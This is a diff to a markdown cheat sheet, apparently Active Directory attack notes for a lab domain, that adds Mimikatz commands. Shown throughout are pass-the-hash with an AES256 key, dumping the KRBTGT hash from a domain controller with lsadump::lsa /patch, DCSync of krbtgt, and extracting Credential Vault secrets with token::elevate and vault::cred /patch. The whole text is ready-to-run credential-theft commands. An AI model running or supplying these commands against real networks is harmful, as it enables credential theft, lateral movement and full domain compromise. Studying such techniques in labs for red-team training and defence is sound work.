@@ -88,8 +88,15 @@ C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 # Starts Powershell with logon type 9
 C:> Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:us.techcorp.local /aes256:<user_aes256key> /run:powershell.exe"'
 ```
-- **DCSync**
+- **Get KRBTGT Hash**
 ```powershell
-# Domain Admin privileges required to run DCSync
+# Run on DC, Domain Admin privileges required
+C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <dc-hostname>
+
+# DCSync: Domain Admin privileges required to run 
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+```
+- **Credentials from Credential Vault**
+```powershell
+C:> Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
